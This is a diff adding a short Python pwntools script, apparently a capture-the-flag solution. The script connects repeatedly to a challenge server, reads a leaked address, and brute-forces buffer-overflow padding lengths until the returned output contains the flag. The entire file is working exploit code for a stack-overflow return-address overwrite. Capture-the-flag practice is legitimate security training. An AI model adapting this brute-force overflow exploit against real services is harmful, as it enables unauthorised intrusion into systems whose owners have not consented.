@@ -1,0 +1,13 @@
+#!/usr/bin/env python3
+from pwn import *
+
+for i in range(32,128):
+    p = remote("0.cloud.chals.io", 30096)
+    address = p.readlineS()[112:126]
+    log.info("Trying offset " + str(i) + " for address " + address)
+    p.sendline(b'A'*i + p64(int(address, base=16)))
+    output = p.recvallS()
+    if "shctf" in output:
+        log.success(output)
+        break
+    p.close()
